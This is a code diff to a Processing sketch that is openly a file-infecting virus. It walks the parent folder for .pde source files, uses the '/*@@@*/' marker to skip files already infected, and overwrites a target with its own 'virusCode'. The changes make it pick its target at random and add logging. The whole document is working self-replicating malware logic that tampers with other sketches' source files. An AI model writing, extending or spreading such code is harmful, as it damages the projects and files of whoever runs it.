@@ -21,19 +21,25 @@ void __getPDEPaths(ArrayList<File> a, String dir) {
   }
 }
 
-File __getTheChosenOne(ArrayList<File> a) {
+File __getTheRandomChosenOne(ArrayList<File> a) {
   boolean foundTheChosenOne = false;
   
-  for (File f: a) {
+  while (a.size() > 0) {
+    int idx = int(random(a.size()));
+    File f = a.get(idx);
+    
     try {
       BufferedReader reader = createReader(f.getAbsolutePath());
       String line = reader.readLine();
       if (!line.equals("/*@@@*/")) {
         foundTheChosenOne = true;
+      } else {
+        a.remove(idx);
       }
       reader.close();
     } catch (IOException e) {
       println("Exception: " + e);
+      a.remove(idx);
     }
     
     if (foundTheChosenOne)
@@ -101,9 +107,11 @@ void __infect(File f) {
         String[] virusCode = new String[lines.size()];
         virusCode = lines.toArray(virusCode);
         saveStrings(f.getAbsolutePath(), virusCode);
+      } else {
+        println("failed to rename to " + destPath);
       }
     } catch (SecurityException e) {
-      
+      println(e);  
     }
   }
 }
@@ -112,11 +120,11 @@ void setup() {
   ArrayList<File> allFiles = new ArrayList<File>();  
   String path = new File(sketchPath("")).getParent();
   __getPDEPaths(allFiles, path);
-  File f = __getTheChosenOne(allFiles);
-  
+  File f = __getTheRandomChosenOne(allFiles);
+
   if (f != null) {
+    println("chose: "+ f.getAbsolutePath());
     __infect(f);    
-    println("chose: "+ f.getName());
   } else {
     println("No candidate found");
   }
